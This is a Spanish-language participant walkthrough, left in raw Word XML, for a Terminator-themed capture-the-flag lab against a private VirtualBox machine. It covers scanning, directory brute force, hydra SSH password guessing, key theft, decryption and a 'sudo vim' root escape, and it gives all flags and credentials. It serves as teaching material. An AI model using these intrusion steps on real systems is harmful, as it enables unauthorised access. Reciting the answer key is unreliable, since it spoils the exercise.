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CYBERQUEST «Skynet :: Nodo 07»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Guía completa paso a paso para realizar la actividad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Material para el participante. No contiene las respuestas en orden de descubrimiento: encontrarás las banderas a lo largo de la propia guía.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>0. Cómo funciona la actividad (léelo primero)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Víctima — Skynet-Nodo07 — 10.10.10.7. Es el objetivo (la intranet).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>La víctima NO se toca ni se configura: solo se lee por red (web en el puerto 80 y SSH en el 22). Su pantalla/consola no se usa nunca (no tiene login por teclado; es normal que "no deje escribir").</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Atacante — kali_ciber_david — 10.10.10.2. Es TU máquina: todos los comandos van aquí.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ambas VMs están en una red interna privada (10.10.10.0/24) de VirtualBox.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Todo se teclea en una terminal de la Kali.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>1. Arrancar el laboratorio (en Windows)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Enciende las dos máquinas (PowerShell de Windows):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VBoxManage startvm "kali_ciber_david"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VBoxManage startvm Skynet-Nodo07</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera 2-3 minutos a que arranquen. Abre la ventana de la Kali y entra con tu usuario/contraseña de Kali. Abre una terminal (ventana negra).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Comprueba que alcanzas a la víctima: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ping -c 3 10.10.10.7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Debe responder. Si no responde, revisa el Anexo B.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Truco VirtualBox: haz clic dentro de la ventana de la VM para capturar el teclado; suelta el ratón con Ctrl derecho.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>2. Preparar la Kali (solo la primera vez)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Crea la carpeta de trabajo y entra en ella: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mkdir skynet-tools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cd skynet-tools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Descarga las 3 herramientas del atacante (necesitan internet en la Kali):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https://raw.githubusercontent.com/DAVIDCHIAC/Skynet-Ciber/master/tools/resistance_steg.py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https://raw.githubusercontent.com/DAVIDCHIAC/Skynet-Ciber/master/tools/rsa_tool.py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https://raw.githubusercontent.com/DAVIDCHIAC/Skynet-Ciber/master/tools/dir.txt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ls</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Comprueba que los programas del ataque están instalados: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which nmap gobuster exiftool cewl hydra wget 7z openssl python3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Si alguno sale en blanco, instálalo (pide tu contraseña de Kali):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sudo apt update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sudo apt install -y nmap gobuster libimage-exiftool-perl cewl hydra p7zip-full</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>A partir de aquí, antes de cada paso: cd skynet-tools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Regla de oro: TODAS las URLs del reto empiezan con http:// (nunca https://). Si algo "no conecta", revisa que no se haya colado una s.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>3. Misión P1 · Reconocimiento (ver qué servicios tiene la víctima)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>nmap escanea los "servicios" (puertos) abiertos de la víctima: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nmap -sV -sC 10.10.10.7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>22/tcp → SSH (entrada por terminal remota).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>80/tcp → HTTP (servidor web de la intranet).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>4. Misión P2 · Descubrir páginas ocultas (gobuster)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>El servidor web no lista archivos. gobuster adivina nombres de páginas usando la wordlist dir.txt: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gobuster dir -u http://10.10.10.7 -w dir.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Aparecen rutas como /robots.txt, /personal.html, /archivo/, /nucleo/, /admin/.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>5. Misión P3 · La bandera del robots.txt (F2)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curl -s http://10.10.10.7/robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera:  Fragmento_2=NucleoRojo{RU5DSUEgVEk}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Anota: F2 = NucleoRojo{RU5DSUEgVEk}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>6. Misión P4 · Ingeniería social (leer la intranet)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curl -s http://10.10.10.7/personal.html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curl -s http://10.10.10.7/admin/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>personal.html → perfil de Miles Dyson y la empresa Cyberdyne.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>admin/ → el usuario dyson_m y la pista de que la clave SSH es el nombre de la compañía que dio origen a todo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>7. Misión P5 · Diccionario y contraseña SSH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cewl extrae las palabras de la web y las guarda en palabras.txt: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cewl http://10.10.10.7 -m 5 -d 2 -w palabras.txt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grep -i cyberdyne palabras.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Si cyberdyne no aparece, añádela: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echo Cyberdyne &gt;&gt; palabras.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>hydra prueba cada palabra como contraseña de dyson_m por SSH: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hydra -l dyson_m -P palabras.txt ssh://10.10.10.7 -t 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera:  [22][ssh] host: 10.10.10.7  login: dyson_m  password: Cyberdyne</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Credenciales SSH: dyson_m / Cyberdyne</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Aclaración: palabras.txt se crea con cewl; no se descarga de ningún sitio.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>8. Misión P6 · Entrar por SSH y ver material de Dyson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ssh dyson_m@10.10.10.7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Contraseña: Cyberdyne (no se ve al escribir). Si pregunta "continue connecting? (yes/no)" responde yes.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ls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ls nucleo/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cat bastion/pista1.txt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cat Documentos/pista2.txt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logout</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Dentro de nucleo/ está llave_privada.txt (clave del material cifrado).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>9. Misión P7 · Descargar el material de la intranet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http://10.10.10.7/archivo/evidencias/captura_terminador.jpg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http://10.10.10.7/archivo/evidencias/bandera_nodo.zip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http://10.10.10.7/nucleo/nucleo.conf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http://10.10.10.7/nucleo/nucleo.conf.enc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wget http://10.10.10.7/nucleo/ruido.enc</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>ls → deben estar los 5 ficheros.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>10. Misión M1 · Esteganografía y metadatos (F1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>a) Los metadatos (EXIF) de la foto guardan una bandera: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exiftool captura_terminador.jpg | grep -i description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera:  Image Description : NucleoRojo{TEEgUkVTSVNU}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Anota: F1 = NucleoRojo{TEEgUkVTSVNU}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>b) La foto oculta un mensaje interno (esteganografía DCT). Extráelo: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python3 resistance_steg.py captura_terminador.jpg</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera: transmisión del analista «OJODEDIOS» y la pregunta: ¿Cuál es el nombre de la persona que está al lado del Terminator?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Ayuda: en Terminator 2 la persona que camina junto al T-800 es John Connor. Esa es la contraseña del ARCA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>11. Misión M4 · Abrir el Arca (zip cifrado) → F4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>El zip está cifrado con AES (método 99) y unzip no lo soporta. Usa 7-Zip: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7z x -p"John Connor" bandera_nodo.zip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exiftool bandera.jpg | grep -i description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cat pista4.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera:  NucleoRojo{UyBST1NUUk9T}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Anota: F4 = NucleoRojo{UyBST1NUUk9T}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>12. Misión M3 · Criptografía híbrida → F3 y la ORDEN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>a) Copia la llave privada del home de Dyson (desde la Kali):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scp dyson_m@10.10.10.7:~/nucleo/llave_privada.txt .</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>El punto final es el destino (carpeta actual). No lo olvides.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>b) rsa_tool descifra nucleo.conf y saca la clave de sesión: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python3 rsa_tool.py llave_privada.txt nucleo.conf nucleo.conf.enc</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera:  S3kiRa-07</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>c) Esa clave abre el ruido (AES-256-CBC):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openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -pass pass:S3kiRa-07 -in ruido.enc -out orden.txt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cat orden.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera:  FRAGMENTO_3=NucleoRojo{RU5FIE1VQ0hP}  y una cadena base64.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Anota: F3 = NucleoRojo{RU5FIE1VQ0hP}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>d) La cadena se decodifica dos veces con base64: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echo "Uld3Z1lYUmhjWFZsSUdWeklHRWdiR0Z6SURRNk1EQT0=" | base64 -d | base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera:  El ataque es a las 4:00</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>ORDEN NUCLEAR = El ataque es a las 4:00</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>13. Misión M5 · Escalada a root → F5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ssh dyson_m@10.10.10.7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sudo -l</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera:  (root) NOPASSWD: /usr/bin/vim, /usr/bin/vi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>vim permite abrir una terminal (escape del editor):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sudo vim -c ':!/bin/bash'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Quedas con una consola de root. Lee la última bandera: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cat /root/nucleo/FLAG5.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera:  NucleoRojo{XzAxMTA}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Anota: F5 = NucleoRojo{XzAxMTA}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>14. Misión final · Validar el núcleo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejecuta el validador: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sudo /root/nucleo/nucleo.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Pega los 5 fragmentos en orden (verde cada uno seguido de Enter), formato NucleoRojo{...}, y después la ORDEN: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NucleoRojo{TEEgUkVTSVNU}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NucleoRojo{RU5DSUEgVEk}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NucleoRojo{RU5FIE1VQ0hP}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NucleoRojo{UyBST1NUUk9T}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NucleoRojo{XzAxMTA}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El ataque es a las 4:00</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Espera: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FRASE RECONSTRUIDA (ADN): LA RESISTENCIA TIENE MUCHOS ROSTROS_0110</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="288"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B5F"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; NUCLEO VERIFICADO CON EXITO &lt;&lt;&lt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>¡Misión completada!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>Anexo A · Datos de referencia (para imprimir)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Web víctima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http://10.10.10.7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dyson_m / Cyberdyne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Password del ARCA (zip)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John Connor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Clave de sesión (RSA)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S3kiRa-07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ORDEN NUCLEAR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ataque es a las 4:00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NucleoRojo{TEEgUkVTSVNU}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NucleoRojo{RU5DSUEgVEk}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NucleoRojo{RU5FIE1VQ0hP}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NucleoRojo{UyBST1NUUk9T}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NucleoRojo{XzAxMTA}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LA RESISTENCIA TIENE MUCHOS ROSTROS_0110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Escalada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sudo vim -c ':!/bin/bash'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F2B46"/>
        </w:rPr>
        <w:t>Anexo B · Problemas frecuentes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Síntoma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Causa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 responde 10.10.10.7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Víctima apagada o a medio arrancar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VBoxManage startvm Skynet-Nodo07; esperar 2-3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La Kali no hace ping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Kali sin IP 10.10.10.x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sudo dhclient enp0s8 (o mirar ip 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unsupported protocol scheme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URL mal escrita (falta ://)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Usar http://10.10.10.7 exacto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wget timeout en :443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 usó https:// (puerto 443)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Cambiar a http://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unzip compression method 99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Zip cifrado AES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7z x -p"John Connor" bandera_nodo.zip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exiftool sin "comment"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 bandera está en Image Description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grep -i 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palabras.txt no existe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Aún no se generó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Primero cewl ... -w palabras.txt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Falta la tecla ~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Teclado español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Evitar ~: usar la carpeta skynet-tools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 "deja escribir" en la víctima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 normal (sin login de teclado)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usar esa consola; entrar por SSH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